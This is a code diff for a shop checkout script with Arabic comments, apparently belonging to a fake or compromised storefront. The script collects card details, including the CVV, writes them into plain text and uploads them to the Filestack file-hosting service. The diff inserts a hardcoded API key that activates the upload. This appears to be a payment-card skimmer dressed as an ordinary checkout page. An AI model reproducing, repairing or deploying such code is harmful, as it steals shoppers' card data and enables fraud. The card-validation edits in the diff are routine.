@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
   document.getElementById('product-name').textContent = `${urlParams.name}`;
-  document.getElementById('product-color').textContent = `${urlParams.color}`;
+  document.getElementById('product-color').textContent = ` ${urlParams.color}`;
   document.getElementById('product-price').textContent = `${urlParams.price}`;
   document.getElementById('product-quantity').textContent = `${urlParams.quantity}`;
 
@@ -152,48 +152,43 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `CVV: ${cvv}\n\n`;
       fileContent += `Product Information:\n`;
       fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Price: ${productPriceText}\n`;
-      fileContent += `Quantity: ${productQuantityText}\n`;
-      fileContent += `Total Price: $${totalPrice}\n`;
-      fileContent += `Product Image URL: ${productImageUrl}\n`;
-
-      // تحويل النص إلى Blob وإنشاء ملف نصي
-      const blob = new Blob([fileContent], { type: 'text/plain' });
-      const file = new File([blob], 'order_data.txt', { type: 'text/plain' });
+      fileContent += `Product Price: ${productPriceText}\n`;
+      fileContent += `Product Quantity: ${productQuantityText}\n`;
+      fileContent += `Total Price: ${totalPrice}\n`;
 
       // رفع الملف إلى Filestack
-      uploadFileToFilestack(file);
+      uploadFileToFilestack(fileContent); 
     }
-
-    // إعادة توجيه العميل بعد إتمام العملية
-    window.location.href = "https://checkout.glamhavenbags.shop/thank-you.html";
   });
 
-  // دالة للتحقق من صحة البريد الإلكتروني
+  // دالة للتحقق من البريد الإلكتروني
   function validateEmail(email) {
-    const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
     return regex.test(email);
   }
 
-  // دالة للتحقق من صحة اسم حامل البطاقة
-  function validateCardName(name) {
-    const regex = /^[A-Za-z\s]+$/;
-    return regex.test(name);
+  // دالة للتحقق من اسم حامل البطاقة
+  function validateCardName(cardName) {
+    const regex = /^[A-Za-z ]+$/;  // يجب أن يحتوي الاسم فقط على حروف ومسافات
+    return regex.test(cardName);
   }
 
-  // دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
+  // دالة للتحقق من رقم البطاقة باستخدام خوارزمية لوهان
   function luhnCheck(cardNumber) {
     let sum = 0;
     let shouldDouble = false;
     for (let i = cardNumber.length - 1; i >= 0; i--) {
-      let digit = parseInt(cardNumber.charAt(i));
+      let digit = parseInt(cardNumber[i]);
       if (shouldDouble) {
-        if ((digit *= 2) > 9) digit -= 9;
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
       }
       sum += digit;
       shouldDouble = !shouldDouble;
     }
-    return (sum % 10 === 0);
+    return sum % 10 === 0;
   }
 
   function validateCard(cardNumber) {
@@ -231,7 +226,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // دالة لرفع الملف إلى Filestack
   function uploadFileToFilestack(file) {
-    const client = filestack.init('YOUR_API_KEY');  // استبدل بـ API Key الخاص بك
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
     client.upload(file)
       .then((res) => {
         console.log('File uploaded successfully:', res);
